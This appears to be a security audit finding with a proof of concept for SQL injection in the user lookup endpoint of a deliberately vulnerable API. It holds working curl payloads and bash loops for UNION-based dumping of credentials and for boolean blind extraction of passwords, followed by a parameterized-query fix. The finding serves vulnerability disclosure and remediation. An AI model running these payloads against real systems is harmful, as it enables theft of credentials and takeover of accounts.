# C2 - SQL Injection in User Lookup: Proof of Concept

- **ID**: C2
- **Severity**: Critical
- **Affected file**: `models/user_model.py:72`
- **Entry point**: `GET /users/v1/{username}` -> `api_views/users.py:45` -> `User.get_user(username)`
- **PoC-Status**: theoretical

---

## Vulnerability

`User.get_user` at `models/user_model.py:72` builds a raw SQL query via f-string
interpolation when the application runs in vulnerable mode (`vuln == True`):

```python
user_query = f"SELECT * FROM users WHERE username = '{username}'"
query = db.session.execute(text(user_query))
```

The `username` value is taken verbatim from the URL path parameter and is never
sanitized or parameterized. An unauthenticated attacker can inject arbitrary SQL.

No authentication is required for `GET /users/v1/{username}`.

---

## Attack 1 - UNION-Based Data Extraction (all usernames + passwords)

SQLite has 5 columns in the `users` table:
`id, username, password, email, admin`.

The response template in `get_user` prints columns at index 1 (username) and 3 (email),
so injected columns land in the visible response fields.

```bash
BASE_URL="http://localhost:5000"

# Step 1 - confirm column count and injection point
# Payload: ' UNION SELECT 1,2,3,4,5-- -
curl -s -G "$BASE_URL/users/v1/x" \
  --data-urlencode "ignored=1" \
  --url "$BASE_URL/users/v1/' UNION SELECT 1,'col1_hit',3,'col2_hit',5-- -"
# Expected response contains: {"username": "col1_hit", "email": "col2_hit"}

# Step 2 - dump all usernames and passwords in a single request
# username field receives users.username, email field receives users.password
curl -s "$BASE_URL/users/v1/x' UNION SELECT id,username,password,password,admin FROM users-- -"
```

Decoded payload for Step 2:
```
GET /users/v1/x' UNION SELECT id,username,password,password,admin FROM users-- -
```

Effective SQL executed by the server:
```sql
SELECT * FROM users WHERE username = 'x'
UNION SELECT id,username,password,password,admin FROM users-- -'
```

The response returns the first row of `users` with the real `username` in the `username`
field and the real `password` in the `email` field. Iterate by appending
`LIMIT 1 OFFSET N` to extract every row.

Full dump loop (bash):
```bash
BASE_URL="http://localhost:5000"
for i in 0 1 2 3 4 5; do
  curl -s "$BASE_URL/users/v1/x' UNION SELECT id,username,password,password,admin FROM users LIMIT 1 OFFSET ${i}-- -"
  echo
done
```

---

## Attack 2 - Boolean-Based Blind Injection

Even if the response template changed to suppress output columns, an attacker can infer
data one bit at a time using boolean conditions.

```bash
BASE_URL="http://localhost:5000"

# TRUE condition - user exists (admin's password starts with 'p')
# Returns 200 with user data when condition is true
curl -s "$BASE_URL/users/v1/admin' AND SUBSTR(password,1,1)='p'-- -"

# FALSE condition - no rows returned -> 404
# Returns 404 "User not found" when condition is false
curl -s "$BASE_URL/users/v1/admin' AND SUBSTR(password,1,1)='z'-- -"
```

Effective SQL for the TRUE case:
```sql
SELECT * FROM users WHERE username = 'admin' AND SUBSTR(password,1,1)='p'-- -'
```

Response discrimination:
- HTTP 200 + JSON body  ->  condition TRUE
- HTTP 404 `{"status": "fail", "message": "User not found"}` ->  condition FALSE

A full character-by-character extraction loop:
```bash
BASE_URL="http://localhost:5000"
TARGET="admin"
RESULT=""
for pos in $(seq 1 32); do
  for char in {a..z} {0..9}; do
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
      "$BASE_URL/users/v1/${TARGET}' AND SUBSTR(password,${pos},1)='${char}'-- -")
    if [ "$STATUS" = "200" ]; then
      RESULT="${RESULT}${char}"
      echo "pos ${pos}: ${char}  (so far: ${RESULT})"
      break
    fi
  done
done
echo "Recovered password: $RESULT"
```

---

## Impact

- Unauthenticated extraction of all usernames, plaintext passwords, and email addresses
  from the database.
- With the recovered admin password (or by injecting a known value via a subquery), an
  attacker can log in as any user including administrators.
- Because the query uses `db.session.execute(text(...))` with SQLAlchemy's raw text
  interface, multi-statement injection (stacked queries) depends on the SQLite driver
  configuration but data extraction is fully achievable with the single-statement
  UNION technique above.

---

## Root Cause

`models/user_model.py:72` - f-string concatenation of untrusted path parameter into SQL.

**Fix**: replace with a parameterized query:
```python
user_query = text("SELECT * FROM users WHERE username = :username")
query = db.session.execute(user_query, {"username": username})
```
